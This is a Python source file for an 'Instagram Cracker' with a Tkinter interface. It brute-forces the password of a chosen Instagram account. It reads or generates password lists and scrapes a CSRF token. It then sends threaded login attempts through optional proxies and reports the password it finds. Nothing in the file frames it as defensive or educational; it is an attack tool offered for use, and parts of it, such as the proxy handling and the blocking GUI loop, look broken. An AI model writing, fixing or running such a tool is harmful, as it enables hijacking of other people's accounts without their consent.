import requests
import itertools
import threading
import queue
import time
import random
import string
from bs4 import BeautifulSoup
import tkinter as tk
from tkinter import messagebox, scrolledtext
import os
import sys

class InstagramCracker:
    def __init__(self, username, password_list, proxies=None, delay=0.5):
        self.username = username
        self.password_list = password_list
        self.proxies = proxies
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        })
        self.queue = queue.Queue()
        self.lock = threading.Lock()
        self.stop_event = threading.Event()

    def load_passwords(self):
        with open(self.password_list, "r") as file:
            for password in file:
                self.queue.put(password.strip())

    def generate_random_string(self, length):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def get_csrf_token(self):
        url = "https://www.instagram.com/accounts/login/"
        response = self.session.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        return soup.find("input", {"name": "csrfmiddlewaretoken"})["value"]

    def crack_instagram(self):
        while not self.queue.empty() and not self.stop_event.is_set():
            password = self.queue.get()
            csrf_token = self.get_csrf_token()
            data = {
                "username": self.username,
                "password": password,
                "csrfmiddlewaretoken": csrf_token
            }
            response = self.session.post("https://www.instagram.com/accounts/login/ajax/", data=data, proxies=self.proxies)
            if "authenticated" in response.text:
                with self.lock:
                    print(f"[+] Password found: {password}")
                    self.queue.queue.clear()
                    self.stop_event.set()
                    return password
            else:
                print(f"[-] Password not found: {password}")
            time.sleep(self.delay)
            self.queue.task_done()

    def start_cracking(self, threads=10):
        self.load_passwords()
        for _ in range(threads):
            thread = threading.Thread(target=self.crack_instagram)
            thread.start()
        self.queue.join()

    def generate_password_list(self, length, charset, output_file):
        with open(output_file, "w") as file:
            for password in itertools.product(charset, repeat=length):
                file.write(''.join(password) + '\n')

class InstagramCrackerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Instagram Cracker")

        self.username_label = tk.Label(root, text="Username:")
        self.username_label.pack()
        self.username_entry = tk.Entry(root)
        self.username_entry.pack()

        self.password_file_label = tk.Label(root, text="Password List File:")
        self.password_file_label.pack()
        self.password_file_entry = tk.Entry(root)
        self.password_file_entry.pack()

        self.proxies_label = tk.Label(root, text="Proxies (comma-separated, optional):")
        self.proxies_label.pack()
        self.proxies_entry = tk.Entry(root)
        self.proxies_entry.pack()

        self.delay_label = tk.Label(root, text="Delay between requests (optional, default 0.5):")
        self.delay_label.pack()
        self.delay_entry = tk.Entry(root)
        self.delay_entry.pack()

        self.length_label = tk.Label(root, text="Password Length:")
        self.length_label.pack()
        self.length_entry = tk.Entry(root)
        self.length_entry.pack()

        self.charset_label = tk.Label(root, text="Character Set (e.g., abcdef12345):")
        self.charset_label.pack()
        self.charset_entry = tk.Entry(root)
        self.charset_entry.pack()

        self.output_file_label = tk.Label(root, text="Output File:")
        self.output_file_label.pack()
        self.output_file_entry = tk.Entry(root)
        self.output_file_entry.pack()

        self.generate_passwords_button = tk.Button(root, text="Generate Password List", command=self.generate_passwords)
        self.generate_passwords_button.pack()

        self.start_button = tk.Button(root, text="Start Cracking", command=self.start_cracking)
        self.start_button.pack()

        self.output_text = scrolledtext.ScrolledText(root, width=80, height=20)
        self.output_text.pack()

    def generate_passwords(self):
        length = int(self.length_entry.get())
        charset = self.charset_entry.get()
        output_file = self.output_file_entry.get()
        cracker = InstagramCracker("", "")
        cracker.generate_password_list(length, charset, output_file)
        messagebox.showinfo("Password List Generated", f"Password list generated and saved to {output_file}")

    def start_cracking(self):
        username = self.username_entry.get()
        password_file = self.password_file_entry.get()
        proxies = self.proxies_entry.get()
        delay = float(self.delay_entry.get() or 0.5)

        if proxies:
            proxies = [{ "http": f"http://{proxy}", "https": f"https://{proxy}" } for proxy in proxies.split(",")]
        else:
            proxies = None

        cracker = InstagramCracker(username, password_file, proxies, delay)
        thread = threading.Thread(target=cracker.start_cracking)
        thread.start()

        while not cracker.stop_event.is_set():
            time.sleep(1)
        messagebox.showinfo("Cracking Complete", "Cracking process completed.")

if __name__ == "__main__":
    if sys.platform != "win32":
        messagebox.showerror("Platform Error", "This application is only compatible with Windows.")
        sys.exit(1)

    root = tk.Tk()
    app = InstagramCrackerGUI(root)
    root.mainloop()